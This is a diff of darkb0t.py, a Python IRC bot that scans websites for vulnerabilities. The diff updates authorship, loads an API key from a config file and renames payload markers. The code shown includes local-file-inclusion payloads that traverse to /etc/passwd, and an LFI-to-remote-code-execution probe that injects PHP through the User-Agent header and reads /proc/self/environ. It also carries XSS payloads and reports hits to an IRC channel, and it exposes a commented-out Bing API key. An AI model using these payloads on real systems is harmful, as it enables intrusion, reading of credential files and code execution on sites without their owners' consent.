@@ -1,17 +1,16 @@
 #!/usr/bin/python
 # This was written for educational purpose and pentest only. Use it at your own risk.
 # Author will be not responsible for any damage!
-# !!! Special greetz for my friend sinner_01 !!!
 # Toolname        : darkb0t.py
-# Coder           : baltazar a.k.a b4ltazar < b4ltazar@gmail.com>
-# Version         : 0.4
-# Greetz for rsauron and low1z, great python coders
-# greetz for d3hydr8, r45c4l, qk, fx0, Soul, MikiSoft, c0ax, b0ne and all members of ex darkc0de.com, ljuska.org & darkartists.info 
+# Coder           : baltazar a.k.a b4ltazar < b4ltazar@gmail.com> , makefu
+# Version         : 0.5
 
-import sys, subprocess, socket, string, httplib, urlparse, urllib, re, urllib2, random, threading, cookielib
+import sys, subprocess, socket, string, httplib, urlparse, urllib, re, urllib2, random, threading, cookielib, json
 from sgmllib import SGMLParser
 from xml.dom.minidom import parse, parseString
 from time import sleep
+
+config = json.load(open("config.json"))
 
 try:
   set
@@ -21,9 +20,9 @@ except NameError:
 
 def logo():
 	print "\n|---------------------------------------------------------------|"
-        print "| b4ltazar[@]gmail[dot]com                                      |"
-        print "|   02/2012     darkb0t.py  v.0.4                               |"
-        print "|    darkartists.info     &      ljuska.org                     |"
+        print "| root[@]euer.krebsco[dot]de                                    |"
+        print "|   04/2012     darkb0t.py  v.0.5                               |"
+        print "|    darkartists.info  &  ljuska.org  & euer.krebsco.de         |"
         print "|                                                               |"
         print "|---------------------------------------------------------------|\n"
 
@@ -101,7 +100,7 @@ sqlerrors = {'MySQL': 'error in your SQL syntax',
 
 lfis = ["/etc/passwd%00","../etc/passwd%00","../../etc/passwd%00","../../../etc/passwd%00","../../../../etc/passwd%00","../../../../../etc/passwd%00","../../../../../../etc/passwd%00","../../../../../../../etc/passwd%00","../../../../../../../../etc/passwd%00","../../../../../../../../../etc/passwd%00","../../../../../../../../../../etc/passwd%00","../../../../../../../../../../../etc/passwd%00","../../../../../../../../../../../../etc/passwd%00","../../../../../../../../../../../../../etc/passwd%00","/etc/passwd","../etc/passwd","../../etc/passwd","../../../etc/passwd","../../../../etc/passwd","../../../../../etc/passwd","../../../../../../etc/passwd","../../../../../../../etc/passwd","../../../../../../../../etc/passwd","../../../../../../../../../etc/passwd","../../../../../../../../../../etc/passwd","../../../../../../../../../../../etc/passwd","../../../../../../../../../../../../etc/passwd","../../../../../../../../../../../../../etc/passwd"]
 
-xsses = ["<h1>XSS by baltazar</h1>","%3Ch1%3EXSS%20by%20baltazar%3C/h1%3E"]
+xsses = ["<h1>AIDSBALLS</h1>","%3Ch1%3EAIDSBALLS%3C/h1%3E"]
 
 timeout = 300
 socket.setdefaulttimeout(timeout)
@@ -115,7 +114,8 @@ chan = sys.argv[4]
 
 def revip():
   sites = [target]
-  appid = '01CDBCA91C590493EE4E91FAF83E5239FEF6ADFD'
+  #appid = '01CDBCA91C590493EE4E91FAF83E5239FEF6ADFD' #thanks for the bing api key
+  appid = config["appid"]
   ip = socket.gethostbyname(target)
   offset = 50
   num = 1
@@ -224,13 +224,13 @@ def lfi_rce(u):
 	sleep(2)
 	target = u+lfi
 	target = target.replace("/etc/passwd", "/proc/self/environ")
-	header = "<? echo md5(baltazar); ?>"
+	header = "<? echo md5(AIDSBALLS); ?>"
 	try:
 	  request_web = urllib2.Request(target)
 	  request_web.add_header('User-Agent', header)
 	  text = urllib2.urlopen(request_web)
 	  text = text.read()
-	  if re.findall("f17f4b3e8e709cd3c89a6dbd949d7171", text):
+	  if re.findall("9da7ebf3a006b8fc7dc94aeb30ff74b3", text):
 	    print "[!] w00t,w00t!: ", target, " ---> LFI to RCE Found"
 	    s.send("PRIVMSG %s :%s%s%s\r\n" % (chan, "[!] w00t!,w00t!: ", target, " ---> LFI to RCE Found"))
 	    sleep(2)
@@ -243,7 +243,7 @@ def xss(u):
   for xss in xsses:
     try:
       source = urllib2.urlopen(u+xss.replace("\n", "")).read()
-      if re.findall("XSS by baltazar", source):
+      if re.findall("AIDSBALLS", source):
 	print "[!] w00t,w00t!: ", u+xss, " ---> XSS found (might be false)"
 	s.send("PRIVMSG %s :%s%s%s\r\n" % (chan, "[!] w00t!,w00t!: ", u+xss, " ---> XSS found (might be false)"))
     except:
@@ -344,7 +344,7 @@ ircmsg = ""
 s = socket.socket( )
 s.connect((host, port))
 s.send("NICK %s\r\n" % nick)
-s.send("USER %s %s baltazar :%s\r\n" % (nick,nick,nick))
+s.send("USER %s %s darkb0t :%s\r\n" % (nick,nick,nick))
 s.send("JOIN :%s\r\n" % chan)
 
 while 1:
@@ -358,9 +358,8 @@ while 1:
       if line[1] == "JOIN":
 	name = str(line[0].split("!")[0])
 	s.send("PRIVMSG %s :%s%s\r\n" % (chan, "Welcome, ", name.replace(":","")))
-	s.send("PRIVMSG %s :%s\r\n" % (chan, "b4ltazar@gmail.com"))
-	s.send("PRIVMSG %s :%s\r\n" % (chan, "darkb0t.py v.0.4"))
-	s.send("PRIVMSG %s :%s\r\n" % (chan, "Visit ljuska.org & darkartists.info"))
+	s.send("PRIVMSG %s :%s\r\n" % (chan, "root@krebsco.de"))
+	s.send("PRIVMSG %s :%s\r\n" % (chan, "darkb0t.py v.0.5"))
 	s.send("PRIVMSG %s :%s\r\n" % (chan, "For help type: !help"))
 	
       if line[3] == ":!help":
@@ -384,8 +383,8 @@ while 1:
 	s.send("PRIVMSG %s :%s\r\n" % (chan, "[!] !dork index.php?id= com 10 10"))
 	
       if line[3] == ":!over":
-	s.send("PRIVMSG %s :%s\r\n" % (chan, "[!] darkb0t leaves, visit ljuska.org & darkartists.info"))
-	print "\n[!] Thx for using darkb0t, visit ljuska.org & darkartists.info"
+	s.send("PRIVMSG %s :%s\r\n" % (chan, "[!] darkb0t leaves"))
+	print "\n[!] Thx for using darkb0t"
 	sys.exit(1)
 	
       if line[3] == ":!clear":
